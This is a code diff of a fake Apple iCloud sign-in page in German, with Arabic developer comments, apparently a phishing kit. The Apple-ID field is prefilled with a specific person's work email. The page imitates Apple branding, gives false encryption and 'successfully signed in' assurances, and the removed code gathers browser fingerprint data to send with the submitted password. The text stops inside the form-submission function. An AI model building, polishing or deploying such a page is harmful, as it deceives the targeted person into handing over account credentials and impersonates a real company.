@@ -4,697 +4,886 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>iCloud - Anmelden • Apple</title>
-    <link rel="icon" href="https://www.apple.com/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.apple.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://www.apple.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://www.apple.com/favicon-16x16.png">
+    <link rel="mask-icon" href="https://www.apple.com/safari-pinned-tab.svg" color="#000000">
+    <meta name="apple-mobile-web-app-title" content="iCloud">
+    <meta name="application-name" content="iCloud">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="description" content="Melden Sie sich bei iCloud an, um auf Fotos, Videos, Dokumente, Kontakte und mehr von allen Ihren Geräten zuzugreifen.">
+    
+    <!-- Apple Fonts -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700&family=SF+Pro+Text:wght@400;500;600&display=swap">
+    
     <style>
-        /* 🔧 CSS محسن */
+        /* 🎨 CSS Variables - Apple Design System */
         :root {
             --apple-blue: #007AFF;
-            --apple-gray: #8E8E93;
-            --apple-light-gray: #F5F5F7;
-            --apple-border: #C7C7CC;
+            --apple-blue-dark: #0056CC;
+            --apple-green: #34C759;
+            --apple-red: #FF3B30;
+            --apple-orange: #FF9500;
+            --apple-purple: #AF52DE;
+            --apple-pink: #FF2D55;
+            
+            --gray-1: #F5F5F7;
+            --gray-2: #E5E5EA;
+            --gray-3: #D1D1D6;
+            --gray-4: #C7C7CC;
+            --gray-5: #8E8E93;
+            --gray-6: #636366;
+            --gray-7: #48484A;
+            --gray-8: #3A3A3C;
+            --gray-9: #2C2C2E;
+            --gray-10: #1D1D1F;
+            
+            --text-primary: #000000;
+            --text-secondary: #8E8E93;
+            --text-tertiary: #C7C7CC;
+            
+            --background-primary: #FFFFFF;
+            --background-secondary: #F5F5F7;
+            --background-tertiary: #E5E5EA;
+            
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.08);
+            --shadow-md: 0 4px 16px rgba(0, 0, 0, 0.12);
+            --shadow-lg: 0 8px 32px rgba(0, 0, 0, 0.16);
+            --shadow-xl: 0 16px 48px rgba(0, 0, 0, 0.20);
+            
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+            --radius-full: 9999px;
+            
+            --transition-fast: 150ms ease;
+            --transition-normal: 250ms ease;
+            --transition-slow: 350ms ease;
         }
         
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+        /* 🔧 CSS Reset & Base Styles */
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
         
-        body { 
+        html {
+            font-size: 16px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            text-rendering: optimizeLegibility;
+        }
+        
+        body {
+            font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-weight: 400;
+            line-height: 1.5;
+            color: var(--text-primary);
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
             position: relative;
             overflow-x: hidden;
         }
         
-        /* 🌟 تأثيرات خلفية متقدمة */
-        .bg-effects {
+        /* 🌟 Advanced Background Effects */
+        .background-effects {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: -1;
-            overflow: hidden;
+            z-index: 1;
+            pointer-events: none;
         }
         
-        .bubble {
+        .floating-shape {
             position: absolute;
-            border-radius: 50%;
             background: rgba(255, 255, 255, 0.1);
-            animation: float 15s infinite linear;
+            border-radius: var(--radius-full);
+            animation: float 20s infinite linear;
+        }
+        
+        .shape-1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            left: 5%;
+            animation-delay: 0s;
+        }
+        
+        .shape-2 {
+            width: 200px;
+            height: 200px;
+            bottom: 15%;
+            right: 10%;
+            animation-delay: -5s;
+        }
+        
+        .shape-3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 80%;
+            animation-delay: -10s;
         }
         
         @keyframes float {
-            0% { transform: translateY(100vh) rotate(0deg); }
-            100% { transform: translateY(-100px) rotate(360deg); }
+            0% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+            25% {
+                transform: translate(20px, -20px) rotate(90deg);
+            }
+            50% {
+                transform: translate(0, -40px) rotate(180deg);
+            }
+            75% {
+                transform: translate(-20px, -20px) rotate(270deg);
+            }
+            100% {
+                transform: translate(0, 0) rotate(360deg);
+            }
         }
         
-        .container { 
-            width: 100%; 
-            max-width: 420px; 
-            background: white; 
-            border-radius: 20px; 
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3); 
+        /* 🎯 Main Container */
+        .icloud-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--background-primary);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-xl);
             overflow: hidden;
-            animation: slideUp 0.6s ease-out;
             position: relative;
             z-index: 10;
+            animation: containerEntrance 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(50px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes containerEntrance {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
         
-        .header { 
-            padding: 40px 32px 32px; 
-            text-align: center; 
-            border-bottom: 1px solid #E5E5EA; 
-            background: linear-gradient(135deg, #ffffff 0%, #f9f9f9 100%);
+        /* 🍎 Apple Header */
+        .apple-header {
+            padding: 40px 40px 32px;
+            text-align: center;
+            border-bottom: 1px solid var(--background-tertiary);
+            background: linear-gradient(135deg, var(--background-primary) 0%, #fafafa 100%);
+            position: relative;
+            overflow: hidden;
         }
         
-        .apple-logo { 
-            font-size: 64px; 
-            color: #000; 
+        .apple-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--apple-blue), var(--apple-green), var(--apple-purple));
+            animation: gradientShift 3s ease infinite;
+        }
+        
+        @keyframes gradientShift {
+            0%, 100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+        
+        .apple-logo-wrapper {
             margin-bottom: 24px;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .header h1 { 
-            font-size: 28px; 
-            font-weight: 700; 
-            color: #000; 
-            margin-bottom: 8px; 
-            letter-spacing: -0.5px;
-        }
-        
-        .header p { 
-            font-size: 15px; 
-            color: var(--apple-gray); 
-            line-height: 1.4;
-        }
-        
-        .form { 
-            padding: 36px; 
-        }
-        
-        .input-group { 
-            margin-bottom: 24px; 
             position: relative;
         }
         
-        .input-group label { 
-            display: block; 
-            font-size: 14px; 
-            color: #000; 
-            margin-bottom: 8px; 
-            font-weight: 600; 
+        .apple-logo {
+            font-size: 64px;
+            color: var(--text-primary);
+            display: inline-block;
+            animation: logoPulse 3s ease-in-out infinite;
+            position: relative;
+        }
+        
+        .apple-logo::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            border-radius: var(--radius-full);
+            background: rgba(0, 122, 255, 0.1);
+            animation: logoGlow 2s ease-in-out infinite;
+        }
+        
+        @keyframes logoPulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+        }
+        
+        @keyframes logoGlow {
+            0%, 100% {
+                opacity: 0.5;
+                transform: translate(-50%, -50%) scale(1);
+            }
+            50% {
+                opacity: 0.8;
+                transform: translate(-50%, -50%) scale(1.2);
+            }
+        }
+        
+        .lock-icon {
+            font-size: 32px;
+            margin-bottom: 16px;
+            animation: lockBounce 2s ease-in-out infinite;
+        }
+        
+        @keyframes lockBounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+        
+        .header-title {
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, var(--text-primary), var(--gray-6));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .header-subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            line-height: 1.6;
+            max-width: 320px;
+            margin: 0 auto;
+        }
+        
+        /* 📝 Login Form */
+        .login-form {
+            padding: 40px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
-        .apple-input { 
-            width: 100%; 
-            padding: 18px 20px; 
-            border: 2px solid var(--apple-border); 
-            border-radius: 12px; 
-            font-size: 16px; 
-            transition: all 0.3s ease;
-            background: #fafafa;
-        }
-        
-        .apple-input:focus { 
-            outline: none; 
-            border-color: var(--apple-blue); 
-            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
-            background: white;
-            transform: translateY(-2px);
-        }
-        
-        .password-wrapper {
+        .input-wrapper {
             position: relative;
         }
         
-        .toggle-password {
+        .apple-input {
+            width: 100%;
+            padding: 16px 52px 16px 20px;
+            font-size: 17px;
+            font-family: 'SF Pro Text', sans-serif;
+            color: var(--text-primary);
+            background: var(--background-primary);
+            border: 2px solid var(--gray-3);
+            border-radius: var(--radius-md);
+            transition: all var(--transition-normal);
+            appearance: none;
+            outline: none;
+        }
+        
+        .apple-input:focus {
+            border-color: var(--apple-blue);
+            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.1);
+            background: var(--background-primary);
+        }
+        
+        .apple-input:valid {
+            border-color: var(--apple-green);
+        }
+        
+        .apple-input.error {
+            border-color: var(--apple-red);
+        }
+        
+        .input-icon {
             position: absolute;
-            right: 15px;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 20px;
+            color: var(--text-tertiary);
+            pointer-events: none;
+        }
+        
+        .password-toggle {
+            position: absolute;
+            right: 20px;
             top: 50%;
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: var(--apple-gray);
+            color: var(--text-tertiary);
             cursor: pointer;
-            font-size: 14px;
+            padding: 8px;
+            font-size: 18px;
+            transition: color var(--transition-fast);
+            z-index: 2;
         }
         
-        .apple-button { 
-            width: 100%; 
-            padding: 20px; 
-            background: linear-gradient(135deg, var(--apple-blue) 0%, #0056CC 100%);
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            font-size: 18px; 
-            font-weight: 700; 
+        .password-toggle:hover {
+            color: var(--apple-blue);
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+        
+        .checkbox-wrapper {
+            position: relative;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .apple-checkbox {
+            position: absolute;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
             cursor: pointer;
-            transition: all 0.3s ease;
+            z-index: 1;
+        }
+        
+        .checkbox-custom {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--gray-3);
+            border-radius: 4px;
+            transition: all var(--transition-fast);
+        }
+        
+        .apple-checkbox:checked ~ .checkbox-custom {
+            background: var(--apple-blue);
+            border-color: var(--apple-blue);
+        }
+        
+        .apple-checkbox:checked ~ .checkbox-custom::after {
+            content: '✓';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .checkbox-label {
+            font-size: 14px;
+            color: var(--text-secondary);
+            cursor: pointer;
+        }
+        
+        /* 🔄 Progress Bar */
+        .progress-container {
+            margin-top: 24px;
+            display: none;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--background-tertiary);
+            border-radius: var(--radius-full);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--apple-green), var(--apple-blue));
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                90deg,
+                transparent 0%,
+                rgba(255, 255, 255, 0.3) 50%,
+                transparent 100%
+            );
+            animation: shimmer 1.5s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(100%);
+            }
+        }
+        
+        .progress-text {
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        /* ✅ Success Animation */
+        .success-container {
+            text-align: center;
+            padding: 24px;
+            display: none;
+        }
+        
+        .success-icon {
+            font-size: 64px;
+            color: var(--apple-green);
+            animation: successScale 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 16px;
+        }
+        
+        @keyframes successScale {
+            0% {
+                transform: scale(0);
+            }
+            70% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        
+        .success-message {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        
+        .success-submessage {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-top: 8px;
+        }
+        
+        /* 🎯 Submit Button */
+        .submit-container {
+            margin-top: 32px;
+        }
+        
+        .apple-button {
+            width: 100%;
+            padding: 18px 24px;
+            font-size: 17px;
+            font-weight: 600;
+            font-family: 'SF Pro Text', sans-serif;
+            color: white;
+            background: linear-gradient(135deg, var(--apple-blue), var(--apple-blue-dark));
+            border: none;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            transition: all var(--transition-normal);
+            position: relative;
+            overflow: hidden;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .apple-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .apple-button:hover::before {
+            left: 100%;
         }
         
         .apple-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
         }
         
         .apple-button:active {
-            transform: translateY(-1px);
+            transform: translateY(0);
         }
         
         .apple-button:disabled {
             opacity: 0.7;
             cursor: not-allowed;
-            transform: none;
+            transform: none !important;
         }
         
-        .loading { 
-            display: none; 
-            font-size: 14px; 
-            color: var(--apple-blue); 
-            text-align: center; 
-            margin-top: 16px; 
-            font-weight: 500;
+        .button-icon {
+            font-size: 20px;
         }
         
-        .dots {
-            display: inline-block;
-            animation: dots 1.5s infinite;
+        /* 🔒 Security Info */
+        .security-info {
+            margin-top: 24px;
+            padding: 16px;
+            background: var(--background-secondary);
+            border-radius: var(--radius-md);
+            border: 1px solid var(--background-tertiary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
         }
         
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60%, 100% { content: '...'; }
+        .security-icon {
+            font-size: 16px;
+            color: var(--apple-green);
         }
         
-        .security-info { 
-            margin-top: 24px; 
-            padding: 16px; 
-            background: #F2F2F7; 
-            border-radius: 10px; 
-            font-size: 13px; 
-            color: var(--apple-gray); 
+        .security-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+        
+        .security-time {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        
+        /* 👣 Footer */
+        .apple-footer {
+            padding: 24px 40px;
+            background: var(--background-secondary);
+            border-top: 1px solid var(--background-tertiary);
             text-align: center;
-            border: 1px solid #E5E5EA;
         }
         
-        .security-info i {
-            margin-right: 8px;
-        }
-        
-        .footer { 
-            padding: 24px; 
-            text-align: center; 
-            font-size: 13px; 
-            color: var(--apple-gray); 
-            border-top: 1px solid #E5E5EA;
-            background: #f9f9f9;
+        .copyright {
+            font-size: 12px;
+            color: var(--text-tertiary);
+            margin-bottom: 16px;
         }
         
         .footer-links {
-            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 24px;
         }
         
-        .footer-links a {
+        .footer-link {
+            font-size: 13px;
             color: var(--apple-blue);
             text-decoration: none;
-            margin: 0 12px;
-            transition: color 0.3s;
+            transition: color var(--transition-fast);
+            position: relative;
+            padding: 4px 0;
         }
         
-        .footer-links a:hover {
-            text-decoration: underline;
-            color: #0056CC;
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: var(--apple-blue);
+            transition: width var(--transition-normal);
         }
         
-        /* 🔍 شريط التقدم */
-        .progress-bar {
+        .footer-link:hover {
+            color: var(--apple-blue-dark);
+        }
+        
+        .footer-link:hover::after {
             width: 100%;
-            height: 4px;
-            background: #E5E5EA;
-            border-radius: 2px;
-            margin-top: 20px;
-            overflow: hidden;
-            display: none;
         }
         
-        .progress {
-            height: 100%;
-            background: linear-gradient(90deg, #34C759, var(--apple-blue));
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        /* 📱 تصميم متجاوب */
+        /* 📱 Responsive Design */
         @media (max-width: 480px) {
-            .container {
-                max-width: 95%;
-                border-radius: 16px;
+            .icloud-container {
+                border-radius: var(--radius-lg);
+                max-width: 100%;
             }
             
-            .header {
-                padding: 30px 24px 24px;
-            }
-            
-            .form {
-                padding: 30px 24px;
+            .apple-header,
+            .login-form,
+            .apple-footer {
+                padding: 24px;
             }
             
             .apple-logo {
                 font-size: 56px;
             }
             
+            .header-title {
+                font-size: 24px;
+            }
+            
+            .header-subtitle {
+                font-size: 14px;
+            }
+            
+            .footer-links {
+                gap: 16px;
+            }
+            
             .apple-button {
-                padding: 18px;
+                padding: 16px;
             }
         }
         
-        /* 🎨 تأثيرات دخول */
-        .success-check {
-            color: #34C759;
-            font-size: 48px;
-            text-align: center;
-            margin: 20px 0;
-            display: none;
+        /* 🎨 Dark Mode Support */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --text-primary: #FFFFFF;
+                --text-secondary: #8E8E93;
+                --text-tertiary: #636366;
+                
+                --background-primary: #1D1D1F;
+                --background-secondary: #2C2C2E;
+                --background-tertiary: #3A3A3C;
+                
+                --gray-1: #2C2C2E;
+                --gray-2: #3A3A3C;
+                --gray-3: #48484A;
+            }
+            
+            .icloud-container {
+                border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            .apple-header {
+                background: linear-gradient(135deg, #1D1D1F 0%, #2C2C2E 100%);
+            }
         }
         
-        /* 🔒 رمز القفل المتحرك */
-        .lock-animation {
-            font-size: 40px;
-            text-align: center;
-            margin-bottom: 20px;
-            animation: lock 2s infinite;
+        /* ⚡ Micro-interactions */
+        .shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
         }
         
-        @keyframes lock {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+        @keyframes shake {
+            10%, 90% {
+                transform: translateX(-1px);
+            }
+            20%, 80% {
+                transform: translateX(2px);
+            }
+            30%, 50%, 70% {
+                transform: translateX(-4px);
+            }
+            40%, 60% {
+                transform: translateX(4px);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
     </style>
-    <!-- 📊 إضافة Google Analytics (اختياري) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXX-Y"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'UA-XXXXX-Y');
-    </script>
 </head>
 <body>
-    <!-- 🌟 تأثيرات الخلفية -->
-    <div class="bg-effects" id="bgEffects"></div>
+    <!-- 🌟 Background Effects -->
+    <div class="background-effects">
+        <div class="floating-shape shape-1"></div>
+        <div class="floating-shape shape-2"></div>
+        <div class="floating-shape shape-3"></div>
+    </div>
     
-    <div class="container">
-        <div class="header">
-            <div class="apple-logo"></div>
-            <div class="lock-animation">🔒</div>
-            <h1>Bei iCloud anmelden</h1>
-            <p>Geben Sie Ihre Apple-ID und Ihr Passwort ein, um sich bei iCloud anzumelden und auf alle Apple-Dienste zuzugreifen.</p>
+    <!-- 🎯 Main Container -->
+    <div class="icloud-container">
+        <!-- 🍎 Apple Header -->
+        <div class="apple-header">
+            <div class="apple-logo-wrapper">
+                <div class="apple-logo"></div>
+            </div>
+            <div class="lock-icon">🔒</div>
+            <h1 class="header-title">Bei iCloud anmelden</h1>
+            <p class="header-subtitle">
+                Geben Sie Ihre Apple-ID und Ihr Passwort ein, um auf alle Ihre Daten, 
+                Fotos, Kontakte und mehr zuzugreifen.
+            </p>
         </div>
         
-        <form class="form" id="icloudForm" onsubmit="return submitForm(event)">
-            <div class="input-group">
-                <label for="appleId">Apple-ID</label>
-                <input type="email" id="appleId" class="apple-input" 
-                       placeholder="name@beispiel.com" 
-                       value="langer.steffen@convex-bau.de" 
-                       required
-                       autocomplete="email">
+        <!-- 📝 Login Form -->
+        <form class="login-form" id="icloudForm" onsubmit="return submitForm(event)">
+            <!-- Apple ID -->
+            <div class="form-group">
+                <label class="form-label" for="appleId">Apple-ID</label>
+                <div class="input-wrapper">
+                    <input type="email" 
+                           id="appleId" 
+                           class="apple-input" 
+                           placeholder="name@beispiel.com" 
+                           value="langer.steffen@convex-bau.de" 
+                           required
+                           autocomplete="username"
+                           spellcheck="false">
+                    <div class="input-icon">✉️</div>
+                </div>
             </div>
             
-            <div class="input-group">
-                <label for="password">Passwort</label>
-                <div class="password-wrapper">
-                    <input type="password" id="password" class="apple-input" 
+            <!-- Password -->
+            <div class="form-group">
+                <label class="form-label" for="password">Passwort</label>
+                <div class="input-wrapper">
+                    <input type="password" 
+                           id="password" 
+                           class="apple-input" 
                            placeholder="••••••••" 
                            required
                            autocomplete="current-password">
-                    <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                    <button type="button" class="password-toggle" onclick="togglePasswordVisibility()">
+                        👁️
+                    </button>
+                    <div class="input-icon">🔑</div>
                 </div>
-                <div style="margin-top: 8px; font-size: 12px; color: #666;">
-                    <label>
-                        <input type="checkbox" id="rememberMe"> Angemeldet bleiben
-                    </label>
+                
+                <!-- Remember Me -->
+                <div class="remember-me">
+                    <div class="checkbox-wrapper">
+                        <input type="checkbox" id="rememberMe" class="apple-checkbox">
+                        <div class="checkbox-custom"></div>
+                    </div>
+                    <label for="rememberMe" class="checkbox-label">Angemeldet bleiben</label>
                 </div>
             </div>
             
-            <!-- 🔍 شريط التقدم -->
-            <div class="progress-bar" id="progressBar">
-                <div class="progress" id="progress"></div>
+            <!-- Progress Bar -->
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">
+                    <span>Wird überprüft</span>
+                    <span class="dots">...</span>
+                </div>
             </div>
             
-            <!-- ✅ علامة التحقق -->
-            <div class="success-check" id="successCheck">✅</div>
-            
-            <button type="submit" class="apple-button" id="submitBtn">
-                <span id="btnText">Weiter</span>
-            </button>
-            <div id="loading" class="loading">
-                <span>Wird überprüft</span><span class="dots"></span>
+            <!-- Success Animation -->
+            <div class="success-container" id="successContainer">
+                <div class="success-icon">✅</div>
+                <div class="success-message">Erfolgreich angemeldet!</div>
+                <div class="success-submessage">Sie werden weitergeleitet...</div>
             </div>
             
+            <!-- Submit Button -->
+            <div class="submit-container">
+                <button type="submit" class="apple-button" id="submitBtn">
+                    <span class="button-icon">→</span>
+                    <span id="buttonText">Weiter</span>
+                </button>
+            </div>
+            
+            <!-- Security Info -->
             <div class="security-info">
-                <i>🔒</i> Sichere Ende-zu-Ende-Verschlüsselung • 
-                <span id="currentTime"></span>
+                <div class="security-icon">🔐</div>
+                <div class="security-text">
+                    Sichere Ende-zu-Ende-Verschlüsselung • 
+                    <span class="security-time" id="currentTime"></span>
+                </div>
             </div>
         </form>
         
-        <div class="footer">
-            © 2024 Apple Inc. Alle Rechte vorbehalten.
+        <!-- 👣 Footer -->
+        <div class="apple-footer">
+            <div class="copyright">© 2024 Apple Inc. Alle Rechte vorbehalten.</div>
             <div class="footer-links">
-                <a href="javascript:void(0)" onclick="showHelp()">Hilfe</a>
-                <a href="javascript:void(0)" onclick="showPrivacy()">Datenschutz</a>
-                <a href="javascript:void(0)" onclick="showTerms()">Nutzungsbedingungen</a>
-                <a href="https://www.apple.com" target="_blank">Apple Website</a>
+                <a href="javascript:void(0)" class="footer-link" onclick="showHelp()">Hilfe</a>
+                <a href="javascript:void(0)" class="footer-link" onclick="showPrivacy()">Datenschutz</a>
+                <a href="javascript:void(0)" class="footer-link" onclick="showTerms()">Nutzungsbedingungen</a>
+                <a href="https://www.apple.com" target="_blank" class="footer-link">Apple Website</a>
             </div>
         </div>
     </div>
 
-    <!-- 📝 نافذة المساعدة -->
-    <div id="helpModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; align-items:center; justify-content:center;">
-        <div style="background:white; padding:30px; border-radius:15px; max-width:500px; width:90%;">
-            <h2>Hilfe zur Anmeldung</h2>
-            <p>Geben Sie die Apple-ID und das Passwort ein, das Sie für iTunes, den App Store und iCloud verwenden.</p>
-            <button onclick="closeModal()" style="margin-top:20px; padding:10px 20px; background:var(--apple-blue); color:white; border:none; border-radius:8px; cursor:pointer;">Schließen</button>
+    <!-- 💬 Help Modal -->
+    <div id="helpModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:1000; align-items:center; justify-content:center; backdrop-filter: blur(4px);">
+        <div style="background:var(--background-primary); padding:32px; border-radius:var(--radius-lg); max-width:500px; width:90%; box-shadow:var(--shadow-xl); animation: fadeIn 0.3s ease;">
+            <h2 style="margin-bottom:16px; color:var(--text-primary);">Hilfe zur Anmeldung</h2>
+            <p style="margin-bottom:24px; color:var(--text-secondary); line-height:1.6;">
+                Ihre Apple-ID ist die E-Mail-Adresse, die Sie für Apple-Dienste wie iCloud, 
+                App Store, iTunes, Apple Music und mehr verwenden. 
+                Wenn Sie Ihre Apple-ID oder Ihr Passwort vergessen haben, besuchen Sie 
+                iforgot.apple.com.
+            </p>
+            <button onclick="closeModal()" style="padding:12px 24px; background:var(--apple-blue); color:white; border:none; border-radius:var(--radius-md); font-size:15px; font-weight:600; cursor:pointer; transition:all var(--transition-normal);">Schließen</button>
         </div>
     </div>
 
-    <script>
-        // ⏰ تحديث الوقت
-        function updateTime() {
-            const now = new Date();
-            const timeStr = now.toLocaleDateString('de-DE', {
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit'
-            });
-            document.getElementById('currentTime').textContent = timeStr;
-        }
-        setInterval(updateTime, 60000);
-        updateTime();
-        
-        // 🌟 إنشاء فقاعات في الخلفية
-        function createBubbles() {
-            const bg = document.getElementById('bgEffects');
-            for (let i = 0; i < 20; i++) {
-                const bubble = document.createElement('div');
-                bubble.className = 'bubble';
-                const size = Math.random() * 100 + 20;
-                bubble.style.width = size + 'px';
-                bubble.style.height = size + 'px';
-                bubble.style.left = Math.random() * 100 + 'vw';
-                bubble.style.animationDelay = Math.random() * 15 + 's';
-                bubble.style.opacity = Math.random() * 0.3 + 0.1;
-                bg.appendChild(bubble);
-            }
-        }
-        createBubbles();
-        
-        // 👁️ إظهار/إخفاء كلمة المرور
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const toggleBtn = event.target;
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                toggleBtn.textContent = '🙈';
-            } else {
-                passwordInput.type = 'password';
-                toggleBtn.textContent = '👁️';
-            }
-        }
-        
-        // 📊 جمع بيانات إضافية
-        function collectAdditionalData() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                platform: navigator.platform,
-                cookies: navigator.cookieEnabled,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'direct'
-            };
-        }
-        
-        // 📤 إرسال النموذج
-        async function submitForm(event) {
-            event.preventDefault();
-            
-            const btn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const loading = document.getElementById('loading');
-            const progressBar = document.getElementById('progressBar');
-            const progress = document.getElementById('progress');
-            const successCheck = document.getElementById('successCheck');
-            
